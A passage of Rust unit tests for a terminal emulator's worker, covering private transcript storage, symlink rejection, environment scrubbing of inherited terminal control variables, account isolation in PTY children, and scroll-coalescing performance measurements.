    fn transcript_writer_privatizes_storage_and_preserves_append_behavior() {
        let root = tempdir().unwrap();
        let directory = root.path().join("transcripts");
        fs::create_dir(&directory).unwrap();
        fs::set_permissions(&directory, fs::Permissions::from_mode(0o755)).unwrap();
        let path = directory.join("terminal.log");
        fs::write(&path, b"before\n").unwrap();
        fs::set_permissions(&path, fs::Permissions::from_mode(0o644)).unwrap();

        let writer = TranscriptWriter::start(path.clone(), 1, 1 << 20).unwrap();
        writer.send(b"after\n".to_vec()).unwrap();
        writer.finish();

        assert_eq!(fs::read(&path).unwrap(), b"before\nafter\n");
        assert_eq!(
            fs::metadata(&directory).unwrap().permissions().mode() & 0o777,
            0o700
        );
        assert_eq!(
            fs::metadata(&path).unwrap().permissions().mode() & 0o777,
            0o600
        );
    }

    #[test]
    fn transcript_writer_creates_private_storage() {
        let root = tempdir().unwrap();
        let directory = root.path().join("new-transcripts");
        let path = directory.join("terminal.log");

        TranscriptWriter::start(path.clone(), 1, 1 << 20)
            .unwrap()
            .finish();

        assert_eq!(
            fs::metadata(&directory).unwrap().permissions().mode() & 0o777,
            0o700
        );
        assert_eq!(
            fs::metadata(&path).unwrap().permissions().mode() & 0o777,
            0o600
        );
    }

    #[test]
    fn transcript_writer_stops_at_size_cap_with_marker() {
        let root = tempdir().unwrap();
        let path = root.path().join("terminal.log");

        let writer = TranscriptWriter::start(path.clone(), 64, 16).unwrap();
        writer.send(vec![b'x'; 64]).unwrap();
        writer.send(b"discarded\n".to_vec()).unwrap();
        writer.finish();

        let content = fs::read(&path).unwrap();
        assert!(
            content.ends_with(TRANSCRIPT_TRUNCATED_MARKER),
            "capped transcript should end with the truncation marker"
        );
        assert!(
            content.len() <= 16 + TRANSCRIPT_TRUNCATED_MARKER.len(),
            "capped transcript should not grow past the cap plus marker"
        );
    }

    #[test]
    fn transcript_writer_caps_preexisting_oversized_file() {
        let root = tempdir().unwrap();
        let path = root.path().join("terminal.log");
        fs::write(&path, vec![b'y'; 32]).unwrap();

        let writer = TranscriptWriter::start(path.clone(), 64, 16).unwrap();
        writer.send(b"new output\n".to_vec()).unwrap();
        writer.finish();

        let content = fs::read(&path).unwrap();
        assert_eq!(
            content,
            [vec![b'y'; 32], TRANSCRIPT_TRUNCATED_MARKER.to_vec()].concat(),
            "oversized transcript should keep existing bytes and record nothing more"
        );
    }

    #[test]
    fn transcript_writer_rejects_file_and_directory_symlinks() {
        let root = tempdir().unwrap();
        let directory = root.path().join("transcripts");
        fs::create_dir(&directory).unwrap();
        let victim = directory.join("victim");
        fs::write(&victim, b"unchanged").unwrap();
        let linked_file = directory.join("linked.log");
        symlink(&victim, &linked_file).unwrap();

        assert!(TranscriptWriter::start(linked_file, 1, 1 << 20).is_err());
        assert_eq!(fs::read(&victim).unwrap(), b"unchanged");

        let real_directory = root.path().join("real");
        fs::create_dir(&real_directory).unwrap();
        let linked_directory = root.path().join("linked-directory");
        symlink(&real_directory, &linked_directory).unwrap();
        assert!(
            TranscriptWriter::start(linked_directory.join("terminal.log"), 1, 1 << 20).is_err()
        );
    }

    #[test]
    fn command_and_pty_channels_are_bounded() {
        let (commands, _receiver) = command_channel(1);
        commands.try_send(Command::Hide).unwrap();
        assert!(matches!(
            commands.try_send(Command::Reveal),
            Err(TrySendError::Full(_))
        ));

        let (pty, _receiver) = crossbeam_channel::bounded(1);
        pty.try_send(PtyMessage::Bytes(vec![1])).unwrap();
        assert!(matches!(
            pty.try_send(PtyMessage::Bytes(vec![2])),
            Err(TrySendError::Full(_))
        ));
    }
    #[test]
    fn hidden_idle_wait_is_driven_by_commands_and_child_exit_channels() {
        let (command_tx, command_rx) = command_channel(1);
        let (_pty_tx, pty_rx) = crossbeam_channel::bounded(1);
        let (child_exit_tx, child_exit_rx) = crossbeam_channel::bounded(1);

        command_tx.send(Command::Hide).unwrap();
        assert!(matches!(
            wait_for_worker_event(
                &command_rx,
                &pty_rx,
                &child_exit_rx,
                &crossbeam_channel::never(),
                false,
                true,
                FOREGROUND_POLL_MIN,
            ),
            WorkerEvent::Command(Some(Command::Hide))
        ));

        child_exit_tx
            .send(Ok(ExitStatus::with_exit_code(7)))
            .unwrap();
        assert!(matches!(
            wait_for_worker_event(
                &command_rx,
                &pty_rx,
                &child_exit_rx,
                &crossbeam_channel::never(),
                false,
                true,
                FOREGROUND_POLL_MIN,
            ),
            WorkerEvent::ChildExit(Some(Ok(status))) if status.exit_code() == 7
        ));
    }

    #[test]
    fn child_exit_is_published_exactly_once() {
        let deliveries = AtomicUsize::new(0);
        let (event_tx, event_rx) = crossbeam_channel::unbounded();
        let mut exited = false;

        for status in [7, 8] {
            if let Some(event) =
                child_exit_event(&mut exited, Ok(ExitStatus::with_exit_code(status)), false)
            {
                deliveries.fetch_add(1, Ordering::SeqCst);
                event_tx.send(event).unwrap();
            }
        }

        assert_eq!(deliveries.load(Ordering::SeqCst), 1);
        assert!(matches!(
            event_rx.try_recv(),
            Ok(TerminalEvent::Exited {
                exit_code: 7,
                signal: None,
                intentional: false,
            })
        ));
        assert!(event_rx.try_recv().is_err());
    }

    #[test]
    fn close_receipt_suppresses_only_its_requested_kill_not_crashes_or_wait_errors() {
        use std::os::unix::process::ExitStatusExt;

        let killed = || ExitStatus::from(std::process::ExitStatus::from_raw(libc::SIGKILL));
        assert!(matches!(
            child_exit_event(&mut false, Ok(killed()), true),
            Some(TerminalEvent::Exited {
                intentional: true,
                signal: Some(_),
                ..
            })
        ));
        assert!(matches!(
            child_exit_event(&mut false, Ok(killed()), false),
            Some(TerminalEvent::Exited {
                intentional: false,
                ..
            })
        ));
        let crashed = ExitStatus::from(std::process::ExitStatus::from_raw(libc::SIGSEGV));
        assert!(matches!(
            child_exit_event(&mut false, Ok(crashed), true),
            Some(TerminalEvent::Exited {
                intentional: false,
                ..
            })
        ));
        assert!(matches!(
            child_exit_event(&mut false, Ok(ExitStatus::with_exit_code(7)), true),
            Some(TerminalEvent::Exited {
                exit_code: 7,
                intentional: false,
                ..
            })
        ));
        assert!(matches!(
            child_exit_event(&mut false, Err("reaper failed".into()), true),
            Some(TerminalEvent::Error {
                operation: "wait for child",
                ..
            })
        ));
    }

    fn env_recipe(environment: BTreeMap<String, String>) -> LaunchRecipe {
        LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/sh".to_owned(),
            arguments: Vec::new(),
            working_directory: PathBuf::from("/"),
            environment,
        }
    }

    #[test]
    fn child_environment_advertises_our_own_terminal_identity() {
        let command = command_from_recipe(&env_recipe(BTreeMap::new()));

        assert_eq!(command.get_env("TERM"), Some(OsStr::new("xterm-256color")));
        assert_eq!(command.get_env("COLORTERM"), Some(OsStr::new("truecolor")));
        assert_eq!(command.get_env("TERM_PROGRAM"), Some(OsStr::new("cagents")));
        assert_eq!(
            command.get_env("TERM_PROGRAM_VERSION"),
            Some(OsStr::new(crate::VERSION))
        );
        // The test below proves the scrub removes names; this one proves
        // `command_from_recipe` still calls it. Only markers this host
        // actually set can witness that, so the assertion is conditional
        // rather than absent: on a host inside kitty or tmux it is real
        // coverage of the call site, and on a bare host it costs nothing.
        for name in INHERITED_TERMINAL_MARKERS {
            if matches!(*name, "TERM_PROGRAM" | "TERM_PROGRAM_VERSION" | "COLORTERM") {
                // Set again, deliberately, after the scrub.
                continue;
            }
            if std::env::var_os(name).is_some() {
                assert_eq!(command.get_env(name), None, "{name} reached the child");
            }
        }
    }

    #[test]
    fn every_inherited_marker_is_dropped_from_the_child_environment() {
        // Planted rather than inherited: `CommandBuilder::new` seeds its map
        // from `std::env::vars_os`, so asserting absence on a fresh command
        // would pass on any host that never set these - which is every host
        // for most of the list, and so would pass with the scrub deleted.
        let mut command = CommandBuilder::new("/bin/sh");
        command.env_clear();
        for name in INHERITED_TERMINAL_MARKERS {
            command.env(name, "planted");
        }

        scrub_inherited_markers(&mut command);

        for name in INHERITED_TERMINAL_MARKERS {
            assert_eq!(command.get_env(name), None, "{name} survived the scrub");
        }
        // Each control channel named as well, so that shortening the list is a
        // test failure and not merely a smaller loop: these reach the user's
        // real kitty instance, multiplexer session, Konsole and editor.
        for channel in [
            "KITTY_LISTEN_ON",
            "TMUX",
            "TMUX_PANE",
            "STY",
            "ZELLIJ",
            "ZELLIJ_SESSION_NAME",
            "ZELLIJ_PANE_ID",
            "KONSOLE_DBUS_SERVICE",
            "KONSOLE_DBUS_SESSION",
            "NVIM",
            "NVIM_LISTEN_ADDRESS",
            "VSCODE_IPC_HOOK_CLI",
            "EMACS_SERVER_FILE",
        ] {
            assert!(
                INHERITED_TERMINAL_MARKERS.contains(&channel),
                "{channel} is not scrubbed"
            );
        }
    }

    #[test]
    fn inherited_color_policy_does_not_disable_or_misidentify_the_pty() {
        let mut command = CommandBuilder::new("/bin/sh");
        command.env_clear();
        for (name, value) in [
            ("NO_COLOR", "1"),
            ("FORCE_COLOR", "0"),
            ("CLICOLOR", "0"),
            ("CLICOLOR_FORCE", "1"),
            ("COLORFGBG", "0;15"),
        ] {
            command.env(name, value);
        }
        scrub_inherited_markers(&mut command);
        for name in [
            "NO_COLOR",
            "FORCE_COLOR",
            "CLICOLOR",
            "CLICOLOR_FORCE",
            "COLORFGBG",
        ] {
            assert_eq!(command.get_env(name), None, "{name} reached the PTY");
        }
    }

    #[test]
    fn explicit_recipe_environment_overrides_terminal_defaults() {
        let command = command_from_recipe(&env_recipe(BTreeMap::from([
            ("TERM".to_owned(), "dumb".to_owned()),
            ("KITTY_WINDOW_ID".to_owned(), "3".to_owned()),
            ("NO_COLOR".to_owned(), "1".to_owned()),
            ("FORCE_COLOR".to_owned(), "0".to_owned()),
            ("CLICOLOR".to_owned(), "0".to_owned()),
            ("CLICOLOR_FORCE".to_owned(), "1".to_owned()),
            ("COLORFGBG".to_owned(), "0;15".to_owned()),
            ("COLORTERM".to_owned(), "24bit".to_owned()),
        ])));

        assert_eq!(command.get_env("TERM"), Some(OsStr::new("dumb")));
        assert_eq!(command.get_env("KITTY_WINDOW_ID"), Some(OsStr::new("3")));
        assert_eq!(command.get_env("COLORTERM"), Some(OsStr::new("24bit")));
        assert_eq!(command.get_env("NO_COLOR"), Some(OsStr::new("1")));
        assert_eq!(command.get_env("FORCE_COLOR"), Some(OsStr::new("0")));
        assert_eq!(command.get_env("CLICOLOR"), Some(OsStr::new("0")));
        assert_eq!(command.get_env("CLICOLOR_FORCE"), Some(OsStr::new("1")));
        assert_eq!(command.get_env("COLORFGBG"), Some(OsStr::new("0;15")));
    }

    #[test]
    fn removed_managed_home_cannot_relaunch_from_final_pty_environment() {
        const CHILD: &str = "CAGENTS_REMOVED_ACCOUNT_PTY_TEST";
        if std::env::var_os(CHILD).is_none() {
            let directory = tempfile::tempdir().unwrap();
            for mode in ["inherited", "returned"] {
                assert!(std::process::Command::new(std::env::current_exe().unwrap())
                    .args(["--exact", "terminal::worker::tests::removed_managed_home_cannot_relaunch_from_final_pty_environment", "--nocapture"])
                    .env_clear().env(CHILD, mode).env("HOME", directory.path())
                    .env("XDG_DATA_HOME", directory.path().join("data"))
                    .env("PATH", "/usr/bin:/bin")
                    .env("CODEX_HOME", directory.path().join("data").join(crate::instance::STORAGE_NAME).join("accounts/codex/12345678-1234-4234-8234-123456789abc"))
                    .status().unwrap().success());
            }
            return;
        }
        let homes = crate::account::home::Homes::installation().unwrap();
        let home = homes.path(
            crate::agent::Provider::Codex,
            uuid::Uuid::parse_str("12345678-1234-4234-8234-123456789abc").unwrap(),
        );
        // The child would recreate this absent home if authorization accidentally
        // inspected only the durable recipe rather than the actual launch.
        let mut recipe = env_recipe(BTreeMap::new());
        recipe.arguments = vec!["-c".into(), "mkdir -p \"$CODEX_HOME\"".into()];
        let returned = std::env::var(CHILD).unwrap() == "returned";
        let config = TerminalConfig {
            execution_environment: returned.then(|| {
                crate::terminal_ipc::ChatExecutionEnvironment(BTreeMap::from([(
                    "CODEX_HOME".into(),
                    home.to_str().unwrap().into(),
                )]))
            }),
            ..TerminalConfig::default()
        };
        let session = TerminalSession {
            owned_codex_listener: None,
            recovery_origin: None,
            id: crate::model::TerminalId::new(),
            launch: recipe.clone(),
            transcript_path: None,
            resume_hint: None,
            continuity: crate::model::TerminalContinuity::RelaunchAvailable {
                recipe,
                last_exit: None,
            },
        };
        let (_tx, commands) = command_channel(1);
        let (events, _receiver) = crossbeam_channel::unbounded();
        let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
        let failure = Worker::start(session, config, commands, events, published)
            .err()
            .expect("removed account blocks PTY creation");
        assert!(failure.contains("removed"), "{failure}");
        assert!(
            !home.exists(),
            "the CLI must never recreate the removed home"
        );
    }

    #[test]
    fn selected_account_removals_win_in_fresh_and_returned_pty_children() {
        let directory = tempfile::tempdir().unwrap();
        for returned in [false, true] {
            let mut recipe = env_recipe(BTreeMap::from([
                ("CODEX_API_KEY".into(), "fixture-key".into()),
                ("CODEX_HOME".into(), "/selected".into()),
            ]));
            recipe.working_directory = directory.path().into();
            recipe.unset_environment.insert("CODEX_API_KEY".into());
            recipe.arguments = vec![
                "-c".into(),
                "[ -z \"${CODEX_API_KEY+x}\" ] && [ \"$CODEX_HOME\" = /selected ] && : > isolated"
                    .into(),
            ];
            let config = TerminalConfig {
                execution_environment: returned.then(|| {
                    crate::terminal_ipc::ChatExecutionEnvironment(recipe.environment.clone())
                }),
                ..TerminalConfig::default()
            };
            let (worker, _) = capture_worker_with(recipe, config);
            let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
            while !directory.path().join("isolated").exists() {
                assert!(
                    std::time::Instant::now() < deadline,
                    "PTY did not enforce selected account environment"
                );
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
            worker.run();
            std::fs::remove_file(directory.path().join("isolated")).unwrap();
        }
    }

    const SCROLLBACK_LINES: usize = 2000;
    /// A 0.67s flick at 60 Hz presentation.
    const FRAMES: usize = 40;
    /// What a 120 Hz high-resolution trackpad delivers inside one 60 Hz frame,
    /// which is the situation issue #101 is about.
    const NOTCHES_PER_FRAME: usize = 8;
    const LINES_PER_NOTCH: isize = 3;

    /// One measured scroll run: what the pipeline actually did, what it cost,
    /// where it started and where it ended up.
    #[derive(Debug)]
    struct ScrollRun {
        commands: usize,
        captures: usize,
        wire_bytes: usize,
        origin: (u64, String),
        offset: u64,
        screen: String,
        latency: crate::performance::LatencySummary,
    }

    /// Applies `deltas` to a filled scrollback, driving every command through
    /// the viewport re-read, the snapshot capture and the wire encoding the
    /// daemon would have performed for it.
    fn scroll_run(deltas: impl IntoIterator<Item = isize>) -> ScrollRun {
        use crate::performance::{Action, Recorder};
        use crate::terminal::ipc::{TerminalSnapshot, write_frame};
        use std::time::Instant;

        // libghostty sizes scrollback from its own page pool rather than from
        // a row count, so the pool is asked for generously and the workload
        // then checks that it never reached a bound by accident.
        let (mut worker, _events) = capture_worker_with(
            LaunchRecipe {
                unset_environment: Default::default(),
                program: "/bin/true".into(),
                arguments: Vec::new(),
                working_directory: PathBuf::from("/"),
                environment: BTreeMap::new(),
            },
            TerminalConfig {
                max_scrollback: 4_000_000,
                ..TerminalConfig::default()
            },
        );
        // A deterministic 80-column history, wide enough that a viewport
        // re-read and its wire encoding both do realistic per-cell work.
        let mut history = Vec::with_capacity(SCROLLBACK_LINES * 80);
        for line in 0..SCROLLBACK_LINES {
            history.extend_from_slice(format!("{line:<78}\r\n").as_bytes());
        }
        worker.process_output(history);

        let screen = |snapshot: &RenderSnapshot| {
            snapshot
                .lines
                .iter()
                .map(|line| {
                    line.cells
                        .iter()
                        .map(|cell| cell.text.as_str())
                        .collect::<String>()
                })
                .collect::<Vec<_>>()
                .join("\n")
        };
        let mut recorder = Recorder::default();
        let mut previous = worker.published.snapshot.load_full();
        let origin = (previous.scroll.offset, screen(&previous));
        let mut commands = 0;
        let mut captures = 0;
        let mut wire_bytes = 0;
        for delta in deltas {
            // Returning credit first is what the UI does after drawing, so the
            // worker is free to capture the command that follows.
            worker.published.acknowledge(worker.generation);
            let generation = recorder.commit(Action::TerminalScroll).unwrap();
            assert!(
                !worker.handle_command(Command::Scroll(ScrollCommand::Delta(delta))),
                "a scroll command must not request shutdown"
            );
            let published = worker.published.snapshot.load_full();
            if published.generation != previous.generation {
                captures += 1;
                let mut frame = Vec::new();
                write_frame(&mut frame, &TerminalSnapshot::diff(&published, &previous)).unwrap();
                wire_bytes += frame.len();
            }
            assert!(recorder.redraw_scheduled(generation, Instant::now()));
            previous = published;
            commands += 1;
        }

        let mut durations: Vec<_> = recorder
            .samples()
            .filter_map(|sample| sample.redraw_scheduling_ns.map(Duration::from_nanos))
            .collect();
        ScrollRun {
            commands,
            captures,
            wire_bytes,
            origin,
            offset: previous.scroll.offset,
            screen: screen(&previous),
            latency: crate::performance::LatencySummary::from_durations(&mut durations).unwrap(),
        }
    }

    /// Deterministic scroll workload for issue #101, plus the equivalence that
    /// makes coalescing safe.
    ///
    /// The widget lives in the `ui` feature graph and the emulator in `host`,
    /// so no single build can drive a wheel gesture end to end. This half
    /// measures the expensive half of the pipeline - applying a viewport move
    /// to ghostty, re-reading the viewport into a snapshot, and encoding that
    /// snapshot for the socket - and proves that folding a frame's notches
    /// into one command lands on exactly the same screen. The folding itself
    /// is covered by `terminal::widget::tests`.
    ///
    /// Timings are printed, never asserted: a `test`-profile build with an
    /// unoptimized parser gives a ratio, not a latency budget, and this crate
    /// treats even release numbers as non-gating.
    #[test]
    fn coalescing_a_frame_of_notches_costs_one_capture_and_lands_on_the_same_screen() {
        let notches = FRAMES * NOTCHES_PER_FRAME;
        let per_event = scroll_run(std::iter::repeat_n(-LINES_PER_NOTCH, notches));
        let per_frame = scroll_run(std::iter::repeat_n(
            -LINES_PER_NOTCH * NOTCHES_PER_FRAME as isize,
            FRAMES,
        ));

        // The whole point: the same gesture reaches the same place, showing
        // the same rows, for an eighth of the commands and captures.
        assert_eq!(per_frame.offset, per_event.offset);
        assert_eq!(per_frame.screen, per_event.screen);
        assert_eq!(per_event.captures, notches);
        assert_eq!(per_frame.captures, FRAMES);
        // A run that clamped at the top would satisfy the equality above
        // without having measured scrolling at all.
        assert!(
            per_event.offset > 0,
            "the workload must stay inside scrollback rather than clamp"
        );

        let budget = crate::performance::PerformanceBudget {
            // One coalesced move has to fit inside a 60 Hz frame alongside the
            // rest of that frame's work, so a quarter of a frame at p95.
            interaction_p95: Duration::from_micros(4_166),
            interaction_p99: Duration::from_micros(8_333),
            ..crate::performance::PerformanceBudget::default()
        };
        for (policy, run) in [("per-event", &per_event), ("per-frame", &per_frame)] {
            println!(
                "scroll workload [{policy}] commands={} captures={} wire_bytes={} \
                 p50={:?} p95={:?} p99={:?} worst={:?} within_budget={} (non-gating)",
                run.commands,
                run.captures,
                run.wire_bytes,
                run.latency.median,
                run.latency.p95,
                run.latency.p99,
                run.latency.worst,
                budget.accepts(run.latency)
            );
        }
        println!(
            "scroll workload [saving] commands x{:.2} wire_bytes x{:.2} total_capture_time \
             {:?} -> {:?}",
            per_event.commands as f64 / per_frame.commands as f64,
            per_event.wire_bytes as f64 / per_frame.wire_bytes as f64,
            per_event.latency.median * per_event.commands as u32,
            per_frame.latency.median * per_frame.commands as u32
        );
    }

    /// Folding must not change where a gesture stops, which is the one place
    /// a summed delta could plausibly differ from the notches it replaced.
    #[test]
    fn overshooting_either_bound_clamps_the_same_whether_or_not_it_was_coalesced() {
        let overshoot = SCROLLBACK_LINES as isize * 2;
        let notches = (overshoot / LINES_PER_NOTCH) as usize;

        let top_per_event = scroll_run(std::iter::repeat_n(-LINES_PER_NOTCH, notches));
        let top_per_frame = scroll_run(std::iter::repeat_n(
            -LINES_PER_NOTCH * NOTCHES_PER_FRAME as isize,
            notches / NOTCHES_PER_FRAME,
        ));
        assert_eq!(top_per_event.offset, 0, "the top of scrollback is row zero");
        assert_eq!(top_per_frame.offset, 0);
        assert_eq!(top_per_frame.screen, top_per_event.screen);

        // Coming back down has to land on the live screen again, not one row
        // short of it or past the end of history.
        let bottom_per_event = scroll_run(
            std::iter::repeat_n(-LINES_PER_NOTCH, notches)
                .chain(std::iter::repeat_n(LINES_PER_NOTCH, notches)),
        );
        let bottom_per_frame = scroll_run(
            std::iter::repeat_n(
                -LINES_PER_NOTCH * NOTCHES_PER_FRAME as isize,
                notches / NOTCHES_PER_FRAME,
            )
            .chain(std::iter::repeat_n(
                LINES_PER_NOTCH * NOTCHES_PER_FRAME as isize,
                notches / NOTCHES_PER_FRAME,
            )),
        );
        assert_eq!(bottom_per_frame.offset, bottom_per_event.offset);
        assert_eq!(bottom_per_frame.screen, bottom_per_event.screen);
        assert_eq!(
            (bottom_per_event.offset, &bottom_per_event.screen),
            (bottom_per_event.origin.0, &bottom_per_event.origin.1),
            "returning to the bottom must show the live screen again"
        );
    }
}
